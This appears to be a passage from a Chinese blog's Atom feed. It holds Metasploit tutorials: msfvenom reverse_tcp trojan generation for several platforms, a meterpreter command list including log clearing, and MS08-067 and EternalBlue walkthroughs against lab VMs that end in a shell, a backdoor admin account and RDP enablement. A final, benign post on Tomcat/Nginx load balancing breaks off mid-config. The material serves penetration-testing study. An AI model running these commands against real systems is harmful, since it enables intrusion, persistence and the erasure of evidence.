    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>MSFのreverse_tcp反向连接</title>
    <link href="https://jielunya.github.io/2022/12/19/MSF%E3%81%AEreverse_tcp%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5/"/>
    <id>https://jielunya.github.io/2022/12/19/MSF%E3%81%AEreverse_tcp%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5/</id>
    <published>2022-12-19T14:38:03.000Z</published>
    <updated>2023-01-12T14:50:52.667Z</updated>
    
    <content type="html"><![CDATA[<h2 id="msf生成linux木马文件命令"><a href="#msf生成linux木马文件命令" class="headerlink" title="msf生成linux木马文件命令"></a>msf生成linux木马文件命令</h2><h3 id="生成木马文件"><a href="#生成木马文件" class="headerlink" title="生成木马文件"></a>生成木马文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows：</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=[你的IP] lport=[端口] -f exe &gt; 保存路径/文件名</span><br><span class="line"></span><br><span class="line">Linux:</span><br><span class="line">msfvenom -p linux/x86(x64)/meterpreter/reverse_tcp lhost=[你的IP] lport=[端口] -f elf &gt; 保存路径/文件名</span><br><span class="line"></span><br><span class="line">PHP:</span><br><span class="line">msfvenom -p php/meterpreter_reverse_tcp lhost=[你的IP] lport=[端口] -f raw &gt; 保存路径/文件名.php</span><br><span class="line"></span><br><span class="line">ASP:</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=[你的IP] lport=[端口]-f asp &gt; 保存路径/文件名.asp</span><br><span class="line"></span><br><span class="line">JSP:</span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp lhost=[你的IP] lport=[端口]-f raw &gt; 保存路径/文件名.jsp</span><br><span class="line"></span><br><span class="line">WAR:</span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp lhost=[你的IP] lport=[端口]-f war &gt; 保存路径/文件名.war</span><br></pre></td></tr></table></figure><h3 id="配置、监听、执行"><a href="#配置、监听、执行" class="headerlink" title="配置、监听、执行"></a>配置、监听、执行</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler     #使用监听模块</span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp     #使用和木马相同的payload</span><br><span class="line">set lhost 1xx.xx.xx.xx #kali 的ip</span><br><span class="line">set lport 4444 #木马的端口</span><br></pre></td></tr></table></figure><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exploit/windows/local/bypassuac</span><br><span class="line">exploit/windows/local/bypassuac_injection</span><br><span class="line">exploit/windows/local/bypassuac_vbs</span><br></pre></td></tr></table></figure><h3 id="MSF命令大全"><a href="#MSF命令大全" class="headerlink" title="MSF命令大全"></a>MSF命令大全</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sessions    #sessions –h 查看帮助</span><br><span class="line">sessions -i &lt;ID值&gt;  #进入会话   -k  杀死会话</span><br><span class="line">background  #将当前会话放置后台</span><br><span class="line">run  #执行已有的模块，输入run后按两下tab，列出已有的脚本</span><br><span class="line">info #查看已有模块信息</span><br><span class="line">getuid # 查看权限</span><br><span class="line">getpid # 获取当前进程的pid</span><br><span class="line">sysinfo # 查看目标机系统信息</span><br><span class="line">ps # 查看当前活跃进程    kill &lt;PID值&gt; 杀死进程</span><br><span class="line">idletime #查看目标机闲置时间</span><br><span class="line">reboot / shutdown   #重启/关机</span><br><span class="line">shell #进入目标机cmd shell</span><br><span class="line">日志清除</span><br><span class="line">&gt;clearev  #清除windows中的应用程序日志、系统日志、安全日志</span><br><span class="line">upload file #向目标主机上传文件，例如：upload /root/1.txt d:\1.txt</span><br><span class="line">download file #从目标主机下载文件，例如：download d:\1.txt /root/1.txt</span><br><span class="line">search #在目标主机上搜索文件search -f *test*</span><br><span class="line">execute #在目标主机执行程序execute -H -i -f cmd.exe</span><br><span class="line">getsystem #提权</span><br></pre></td></tr></table></figure><h2 id="解决获得shell后乱码问题"><a href="#解决获得shell后乱码问题" class="headerlink" title="解决获得shell后乱码问题"></a>解决获得shell后乱码问题</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chcp 65001</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;msf生成linux木马文件命令&quot;&gt;&lt;a href=&quot;#msf生成linux木马文件命令&quot; class=&quot;headerlink&quot; title=&quot;msf生成linux木马文件命令&quot;&gt;&lt;/a&gt;msf生成linux木马文件命令&lt;/h2&gt;&lt;h3 id=&quot;生成木马文件&quot;&gt;&lt;</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://jielunya.github.io/tags/CTF/"/>
    
    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>MS08_067漏洞复现(xp系统渗透）</title>
    <link href="https://jielunya.github.io/2022/12/16/MS08_067%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(xp%E7%B3%BB%E7%BB%9F%E6%B8%97%E9%80%8F%EF%BC%89/"/>
    <id>https://jielunya.github.io/2022/12/16/MS08_067%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(xp%E7%B3%BB%E7%BB%9F%E6%B8%97%E9%80%8F%EF%BC%89/</id>
    <published>2022-12-16T12:46:03.000Z</published>
    <updated>2022-12-16T14:08:13.250Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><blockquote>MS08-067漏洞全称是“Windows Server服务RPC请求缓冲区溢出漏洞”，攻击者利用受害者主机默认开放的SMB服务端口445，发送特殊RPC（Remote Procedure Call，远程过程调用）请求，造成栈缓冲区内存错误，从而被利用实施远程代码执行。<p>MS08-067漏洞将会影响Windows 2000&#x2F;XP&#x2F;Server 2003&#x2F;Vista&#x2F;Server 2008的各个版本，甚至还包括 测试阶段的Windows 7 Pro-Beta。 如果用户在受影响的系统上收到特制的 RPC 请求，则该漏洞可能允许远程执行代码。 在 Microsoft Windows 2000、Windows XP 和 Windows Server 2003 系统上，攻击者可能未经身份验 证即可利用此漏洞运行任意代码。 此漏洞可能用于进行蠕虫攻击。 防火墙最佳做法和标准的默认防火 墙配置有助于保护网络资源免受从企业外部发起的攻击。</p><p>漏洞原理：</p><p>MS08-067漏洞是通过MSRPC over SMB通道调用Server程序中的NEtPathCanonicalize函数时触发的。NetPathCanonicalize函数在远程访问其他主机时，会调用NetpwPathCanonicalize函数，对远程访问的路径进行规范化，而在NetpwPathCanonicalize函数中发生了栈缓冲区内存错误（溢出），造成可被利用实施远程代码执行（Remote Code Execution）。</p></blockquote><h2 id="扫描目标靶机"><a href="#扫描目标靶机" class="headerlink" title="扫描目标靶机"></a>扫描目标靶机</h2><blockquote>获取关键信息</blockquote>nmap -A 目标ip<p><img src="/ms08_067/1.png"></p><blockquote>从中获知，445端口开放，系统版本号为xp SP2。</blockquote><h2 id="搜索漏洞"><a href="#搜索漏洞" class="headerlink" title="搜索漏洞"></a>搜索漏洞</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search ms08_067</span><br></pre></td></tr></table></figure><p><img src="/ms08_067/2.png"></p><h2 id="使用ms08-067漏洞"><a href="#使用ms08-067漏洞" class="headerlink" title="使用ms08_067漏洞"></a>使用ms08_067漏洞</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="/ms08_067/3.png"></p><blockquote>可以看到RHOST为必填,设置payload</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set rhosts 192.168.200.133</span><br></pre></td></tr></table></figure><h2 id="选择目标系统-可略过这一步"><a href="#选择目标系统-可略过这一步" class="headerlink" title="选择目标系统(可略过这一步)"></a>选择目标系统(可略过这一步)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show targets</span><br><span class="line">set target 10</span><br></pre></td></tr></table></figure><p><img src="/ms08_067/5.png"><br><img src="/ms08_067/6.png"></p><h2 id="攻击靶机"><a href="#攻击靶机" class="headerlink" title="攻击靶机"></a>攻击靶机</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run或者exploit</span><br></pre></td></tr></table></figure><p>看到下图即为成功<br><img src="/ms08_067/4.png"></p><blockquote>进入meterpreter后输入shell进行提权，即可获得系统权限。</blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a&gt;漏洞简介&lt;/h1&gt;&lt;blockquote&gt;MS08-067漏洞全称是“Windows Server服务RPC请求缓冲区溢出漏洞”，攻击者利用受害者主</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://jielunya.github.io/tags/CTF/"/>
    
    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>使用MSF框架进行系统渗透（永恒之蓝）</title>
    <link href="https://jielunya.github.io/2022/12/13/%E4%BD%BF%E7%94%A8MSF%E6%A1%86%E6%9E%B6%E8%BF%9B%E8%A1%8C%E7%B3%BB%E7%BB%9F%E6%B8%97%E9%80%8F%EF%BC%88%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%EF%BC%89/"/>
    <id>https://jielunya.github.io/2022/12/13/%E4%BD%BF%E7%94%A8MSF%E6%A1%86%E6%9E%B6%E8%BF%9B%E8%A1%8C%E7%B3%BB%E7%BB%9F%E6%B8%97%E9%80%8F%EF%BC%88%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%EF%BC%89/</id>
    <published>2022-12-13T12:53:03.000Z</published>
    <updated>2023-01-15T06:00:16.877Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MSF简介"><a href="#MSF简介" class="headerlink" title="MSF简介"></a>MSF简介</h2><p>Metasploit框架（Metasploit Framework, MSF）是一个开源工具，旨在方便渗透测试，它是由Ruby程序语言编写的模板化框架，具有很好的扩展性，便于渗透测试人员开发、使用定制的工具模板。<br>Metasploit可向后端模块提供多种用来控制测试的接口（如控制台、 Web 、 CLI ）。推荐使用控制台接口，通过控制台接口，你可以访问和使用所有Metasploit的插件，例如Payload、利用模块、 Post模块等。 Metasploit还有第三方程序的接口，例如Nmap、SQLMap 等，可以直接在控制台接口里使用，要访问该界面。</p><h2 id="MSF五大模块类型"><a href="#MSF五大模块类型" class="headerlink" title="MSF五大模块类型"></a>MSF五大模块类型</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Auxiliaries（辅助模块）</span><br><span class="line">该模块不会直接在测试者和目标主机之间建立访问，它们只负责执行扫描、嗅探、指纹识别等相关功能以辅助渗透测试。</span><br><span class="line"></span><br><span class="line">Exploit（漏洞利用模块）</span><br><span class="line">漏洞利用是指由渗透测试者利用 一个系统、应用或者服务中的安全漏洞进行的攻击行为 。流行的渗透攻击技术包括缓冲区溢出、 Web应用程序攻击，以及利用配置错误等，其中包含攻击者或测试人员针对系统中的漏洞而设计的各种POC验证程序，用于破坏系统安全性的攻击代码，每个漏洞都有相应的攻击代码 。</span><br><span class="line"></span><br><span class="line">Payload（攻击载荷模块）</span><br><span class="line">攻击载荷是我们期望目标系统在被渗透攻击之后完成实际攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令或者执行特定代码，在Metasploit框架中可以自由地选择、传送和植入 。攻击载荷也可能是简单地在目标操作系统上执行一些命令，如添加用户账号等 。</span><br><span class="line"></span><br><span class="line">Post（后期渗透模块）</span><br><span class="line">该模块主要用于在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、实施跳板攻击等。</span><br><span class="line"></span><br><span class="line">Encoders（编码工具模块）</span><br><span class="line">该模块在渗透测试中负责免杀，以防止被杀毒软件、防火墙、 IDS及类似的安全软件检测出来</span><br></pre></td></tr></table></figure><h2 id="MSF启动、退出、更新"><a href="#MSF启动、退出、更新" class="headerlink" title="MSF启动、退出、更新"></a>MSF启动、退出、更新</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进入kali虚拟机，打开终端，输入msfconsole，进入MSF框架。</span><br><span class="line">输入命令exit退出MSF框架，来进行框架升级。</span><br><span class="line">使用MSF之前，最好将其更新，以获取更多漏洞模块的支持。</span><br><span class="line">先使用apt update，再使用apt install metasploit-framework。</span><br><span class="line">再次输入命令msfconsole，查询更新后版本，可以看到版本已更新，响应EXP等利用模块均增加了。</span><br></pre></td></tr></table></figure><h2 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h2><p>扫描和收集信息是渗透测试中的第一步，其主要目标是尽可能多地发现有关目标机器的信息。获取的信息越多，渗透的概率就越大。该步骤的主要关注点是目标机器IP地址、可用服务、开放端口等。</p><h3 id="使用辅助模块进行端口扫描"><a href="#使用辅助模块进行端口扫描" class="headerlink" title="使用辅助模块进行端口扫描"></a>使用辅助模块进行端口扫描</h3><p>辅助模块是MSF的内置模块，首先利用search portscan命令查询一下有哪些可用的端口扫描模块，执行过程如下。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; search portscan</span><br></pre></td></tr></table></figure><p><img src="/MSF%E6%A1%86%E6%9E%B6/1.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在上述结果中，可以看到有8个可用的端口扫描模块，此处以tcp端口扫描模块为例进行扫描。输入命令use auxiliary/scanner/portscan/tcp进入对应模块（看&gt;号前面的内容就知道自己所处模块位置），再输入show options查询对应模块需要使用的参数。</span><br></pre></td></tr></table></figure><p><img src="/MSF%E6%A1%86%E6%9E%B6/2.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; set RHOSTS 192.168.200.129 /设置要扫描的ip</span><br><span class="line">RHOSTS =&gt; 192.168.200.129</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; set THREADS 16 /设置线程数，越多越快</span><br><span class="line">THREADS =&gt; 16</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; run</span><br></pre></td></tr></table></figure><p><img src="/MSF%E6%A1%86%E6%9E%B6/3.png"><br>其实还有两条可选命令：setg命令和unsetg命令 。二者用于在msfconsole中设置或者取消设置全局性的参数值，从而避免重复输入相同的值。</p><h3 id="使用辅助模块进行服务扫描"><a href="#使用辅助模块进行服务扫描" class="headerlink" title="使用辅助模块进行服务扫描"></a>使用辅助模块进行服务扫描</h3><p>在扫描目标机器上运行的服务时，有多种基于服务的扫描技术可供选择，例如VNC 、FTP 、SMB等，只需执行特定类型的扫描就可以发现服务。<br>使用命令search scanner可以发现大量的扫描模块，约有600多个，建议读者多尝试不同的辅助扫描模块，了解其用法。<br>使用search scanner&#x2F;smb搜索与SMB服务相关的模块，搜索结果如下。使用的步骤与使用端口扫描模块时的基本相同.<br><img src="/MSF%E6%A1%86%E6%9E%B6/3.2.png"></p><h3 id="使用-Nmap-扫描"><a href="#使用-Nmap-扫描" class="headerlink" title="使用 Nmap 扫描"></a>使用 Nmap 扫描</h3><p>在Metasploit中同样可以使用Nmap扫描，它不仅可以用来确定目标网络上计算机的存活状态，而且可以扫描计算机的操作系统、开放端口、服务等。熟练掌握Nmap的用法可以极大地提高个人的渗透测试技术。<br>在MSF框架中可以直接使用Nmap，输入命令nmap -A 192.168.200.129对靶机进行全面扫描，过程如下，可以看到445端口开启着，可能存在利用永恒之蓝漏洞。<br><img src="/MSF%E6%A1%86%E6%9E%B6/3.1.png"></p><h2 id="漏洞探测及利用"><a href="#漏洞探测及利用" class="headerlink" title="漏洞探测及利用"></a>漏洞探测及利用</h2><h3 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h3><p>在上述信息收集中，我们发现445端口开启，代表着目标靶机运行者SMB服务，这给我们提供了下一步分析了利用的方向。本节内容主要围绕永恒之蓝漏洞展开，因此使用命令search ms17_010查询与永恒之蓝相关的可利用模块，发现公有4个模块，辅助模块和利用模块各两个。<br><img src="/MSF%E6%A1%86%E6%9E%B6/4.png"><br>端口开启不代表就存在永恒之蓝漏洞，因此我们还需要借助更具体的扫描模块来检验是否存在永恒之蓝漏洞，使用命令use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010进入永恒之蓝漏洞扫描模块，输入参数options查看所需参数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; options</span><br></pre></td></tr></table></figure><p><img src="/MSF%E6%A1%86%E6%9E%B6/5.png"><br>在参数查询结果中，可以看到必填项中有RHOSTS还未设置信息，使用set命令设置参数后使用run命令运行该模块。在运行结果的第一行中，Host is likely VULNERABLE to MS17-010!表示主机可能会受到ms17-010漏洞的伤害，也就是存在该漏洞。<br><img src="/MSF%E6%A1%86%E6%9E%B6/6.png"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>到此，我们从发现445端口开启，到验证永恒之蓝漏洞的存在，下一步就是漏洞利用，在前面我们已经搜索到永恒之蓝的两个漏洞利用模块，此处使用第一个进行测试。使用命令use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue进入该模块，并输入命令options查看所需参数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; options</span><br></pre></td></tr></table></figure><p><img src="/MSF%E6%A1%86%E6%9E%B6/7.png"><br>在参数查询结果中，可以看到必填项中有RHOSTS还未设置信息，使用set命令设置参数后使用run命令运行该模块。可以看到漏洞已经利用成功，接下去就可以设置用户及其他留后门的手段了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 192.168.200.129</span><br><span class="line">rhosts =&gt; 192.168.200.129</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br></pre></td></tr></table></figure><p><img src="/MSF%E6%A1%86%E6%9E%B6/8.png"><br>GetShell。输入命令shell来让靶机反弹shell到当前窗口。GetShell成功。<br><img src="/MSF%E6%A1%86%E6%9E%B6/9.png"><br>创建用户并提权为管理员。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\system32&gt;net user yjs21322 yjs21322 /add</span><br><span class="line">C:\Windows\system32&gt;net localgroup /add administrators yjs21322</span><br></pre></td></tr></table></figure><p><img src="/MSF%E6%A1%86%E6%9E%B6/10.png"><br>验证：在win7的终端，输入net user查询用户列表，可以看到yjs21322用户已经在其中。<br><img src="/MSF%E6%A1%86%E6%9E%B6/11.png"></p><blockquote>后渗透，运行命令getsystem先将当前的session提升为system权限</blockquote><blockquote>run post/windows/manage/enable_rdp，利用此后渗透模块即可直接开启远程桌面</blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;MSF简介&quot;&gt;&lt;a href=&quot;#MSF简介&quot; class=&quot;headerlink&quot; title=&quot;MSF简介&quot;&gt;&lt;/a&gt;MSF简介&lt;/h2&gt;&lt;p&gt;Metasploit框架（Metasploit Framework, MSF）是一个开源工具，旨在方便渗透测试，它是</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://jielunya.github.io/tags/CTF/"/>
    
    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>搭建三个Tomcat，并实现负载均衡</title>
    <link href="https://jielunya.github.io/2022/12/12/%E6%90%AD%E5%BB%BA%E4%B8%89%E4%B8%AATomcat%EF%BC%8C%E5%B9%B6%E5%AE%9E%E7%8E%B0%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/"/>
    <id>https://jielunya.github.io/2022/12/12/%E6%90%AD%E5%BB%BA%E4%B8%89%E4%B8%AATomcat%EF%BC%8C%E5%B9%B6%E5%AE%9E%E7%8E%B0%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/</id>
    <published>2022-12-12T12:28:03.000Z</published>
    <updated>2022-12-12T13:21:33.156Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装vim和net-tools"><a href="#安装vim和net-tools" class="headerlink" title="安装vim和net-tools"></a>安装vim和net-tools</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install vim -y</span><br><span class="line">yum install net-tools -y</span><br></pre></td></tr></table></figure><h2 id="安装JDK环境"><a href="#安装JDK环境" class="headerlink" title="安装JDK环境"></a>安装JDK环境</h2><blockquote>将预先下载好jdk解压，并更名为jdk，移动到/usr/local/目录下</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -zxf jdk-8u161-linux-x64.tar.gz</span><br><span class="line">mv  jdk1.8.0_161/ jdk</span><br><span class="line">mv jdk /usr/local</span><br><span class="line">vim /etc/profile</span><br></pre></td></tr></table></figure><blockquote>写入如下内容:</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JAVA_HOME=/usr/local/jdk</span><br><span class="line">PATH=$JAVA_HOME/bin:$PATH</span><br><span class="line">CLASSPATH=$JAVA_HOME/jre/lib/txt:$JAVA_HOME/lib/tools.jar </span><br><span class="line">export JAVA_HOME PATH CLASSPATH </span><br></pre></td></tr></table></figure><blockquote>使配置文件生效</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure><blockquote>java -version #查看是否安装成功</blockquote><h2 id="安装Tomcat"><a href="#安装Tomcat" class="headerlink" title="安装Tomcat"></a>安装Tomcat</h2><blockquote>将预先下载好的tomcat包解压，并更名为tomcat，移动到/usr/local/目录下,并复制另外两个Tomcat出来</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -zxf apache-tomcat-8.5.84.tar.gz</span><br><span class="line">mv apache-tomcat-8.5.84 tomcat</span><br><span class="line">mv tomcat /usr/local</span><br><span class="line">cd /usr/local</span><br><span class="line">cp -r tomcat tomcat1</span><br><span class="line">cp -r tomcat tomcat2</span><br></pre></td></tr></table></figure><h2 id="更改Tomcat配置server-xml中的端口号"><a href="#更改Tomcat配置server-xml中的端口号" class="headerlink" title="更改Tomcat配置server.xml中的端口号"></a>更改Tomcat配置server.xml中的端口号</h2><blockquote>方法一：sed -i 就是直接对文本文件进行操作的 sed -i 's/原字符串/新字符串/g' 对应路径，其中s为替换，g为全局。方法二：命令行模式输入，:%s/源字符串/目的字符串/g这里采用第一种</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sed -i &#x27;s#8080#8081#g&#x27; /usr/local/tomcat1/conf/server.xml </span><br><span class="line">sed -i &#x27;s#8005#8006#g&#x27; /usr/local/tomcat1/conf/server.xml </span><br><span class="line">sed -i &#x27;s#8009#8010#g&#x27; /usr/local/tomcat1/conf/server.xml </span><br><span class="line">sed -i &#x27;s#8080#8082#g&#x27; /usr/local/tomcat2/conf/server.xml </span><br><span class="line">sed -i &#x27;s#8005#8007#g&#x27; /usr/local/tomcat2/conf/server.xml </span><br><span class="line">sed -i &#x27;s#8009#8011#g&#x27; /usr/local/tomcat2/conf/server.xml</span><br></pre></td></tr></table></figure><h2 id="放开端口-或者关闭防火墙"><a href="#放开端口-或者关闭防火墙" class="headerlink" title="放开端口,或者关闭防火墙"></a>放开端口,或者关闭防火墙</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=8080/tcp --permanent</span><br><span class="line">firewall-cmd --zone=public --add-port=8081/tcp -permanent</span><br><span class="line">firewall-cmd --zone=public --add-port=8082/tcp --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld</span><br></pre></td></tr></table></figure><h2 id="启动三个Tomcat并在网页上验证"><a href="#启动三个Tomcat并在网页上验证" class="headerlink" title="启动三个Tomcat并在网页上验证"></a>启动三个Tomcat并在网页上验证</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/local/tomcat/bin/</span><br><span class="line">./startup.sh</span><br><span class="line">cd /usr/local/tomcat1/bin/</span><br><span class="line">./startup.sh</span><br><span class="line">cd /usr/local/tomcat2/bin/</span><br><span class="line">./startup.sh</span><br></pre></td></tr></table></figure><h2 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h2><blockquote>为了方便直接使用脚本安装</blockquote><blockquote>Nginx安装包nginx-1.12.2.tar.gz放在/opt里面</blockquote><blockquote>编写并执行脚本nginx_install.sh，脚本位置随意,如下为脚本内容</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">#======编译安装nginx服务======</span><br><span class="line">#安装所需开发包和编译环境、编译器</span><br><span class="line">yum -y install pcre-devel zlib-devel openssl-devel gcc gcc-c++ make</span><br><span class="line">#创建程序用户，便于准确控制访问</span><br><span class="line">useradd -M -s /sbin/nologin nginx</span><br><span class="line"></span><br><span class="line">#解压安装包</span><br><span class="line">cd /opt</span><br><span class="line">tar zxvf nginx-1.12.2.tar.gz -C /opt/</span><br><span class="line"></span><br><span class="line">#指定安装路径、指定用户名、组名、启用模块以支持统计状态</span><br><span class="line">cd nginx-1.12.2/</span><br><span class="line">./configure --prefix=/usr/local/nginx --user=nginx --group=nginx --with-http_stub_status_module --with-file-aio --with-http_gzip_static_module --with-http_flv_module --with-http_ssl_module</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#编译及安装</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">#软链接便于系统识别nginx操作命令</span><br><span class="line">ln -s /usr/local/nginx/sbin/nginx /usr/local/sbin/</span><br><span class="line"></span><br><span class="line">#添加nginx系统服务</span><br><span class="line">echo &#x27;[Unit]</span><br><span class="line">Description=nginx</span><br><span class="line">After=network.target</span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">PIDFile=/usr/local/nginx/logs/nginx.pid</span><br><span class="line">ExecStart=/usr/local/nginx/sbin/nginx</span><br><span class="line">ExecrReload=/bin/kill -s HUP $MAINPID</span><br><span class="line">ExecrStop=/bin/kill -s QUIT $MAINPID</span><br><span class="line">PrivateTmp=true</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target&#x27; &gt; /lib/systemd/system/nginx.service</span><br><span class="line"></span><br><span class="line">#赋权及开启服务、开启开机自启</span><br><span class="line">chmod 754 /lib/systemd/system/nginx.service</span><br><span class="line">systemctl start nginx.service</span><br><span class="line">systemctl enable nginx.service</span><br></pre></td></tr></table></figure><h2 id="验证三个Tomcat是否启动成功。"><a href="#验证三个Tomcat是否启动成功。" class="headerlink" title="验证三个Tomcat是否启动成功。"></a>验证三个Tomcat是否启动成功。</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ntpl</span><br></pre></td></tr></table></figure><blockquote>如下为成功后会出现的内容<blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcp6       0      0 127.0.0.1:8005          :::*              LISTEN      35174/java          </span><br><span class="line">tcp6       0      0 127.0.0.1:8006          :::*              LISTEN      35186/java          </span><br><span class="line">tcp6       0      0 127.0.0.1:8007          :::*              LISTEN      35200/java          </span><br><span class="line">tcp6       0      0 :::8080                 :::*              LISTEN      35174/java         </span><br><span class="line">tcp6       0      0 :::8081                 :::*              LISTEN      35186/java          </span><br><span class="line">tcp6       0      0 :::8082                 :::*              LISTEN      35200/java</span><br></pre></td></tr></table></figure><h2 id="配置Nginx"><a href="#配置Nginx" class="headerlink" title="配置Nginx"></a>配置Nginx</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/local/nginx/conf</span><br><span class="line">vim nginx.conf</span><br></pre></td></tr></table></figure><blockquote>添加如下内容，没有的就添加，有的就修改</blockquote><blockquote>注意事项:upstream后的名字要与location下的proxy_pass的名字一样。比方：upstream tomcat，proxy_pass http://tomcat;</blockquote><blockquote>注意事项:server_name 为将要映射的域名</blockquote><blockquote>注意事项:upstream下的server接三个相同的ip地址，接三个不同的端口，weight=1为权重，服务每收到3个客户端的请求，会把其中的1个转发给后端a，把其中的1个转发给后端b，把其中的1个转发给后端c，实现负载均衡。max_fails=3,fail_timeout=10s，意思是在10秒内请求某一应用失败3次，认为该应用宕机，然后等待10秒，这段时间内不会再把新请求发送到已经宕机的应用，而是直接发到正常的服务器，时间到后再有请求进来继续尝试连接宕机应用且仅尝试1次，如果还是失败，则继续等待10秒以此循环，直到恢复</blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">worker_processes  1;</span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line">    sendfile        on;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line">    #gzip  on;</span><br><span class="line">    upstream tomcat &#123;</span><br><span class="line">    server 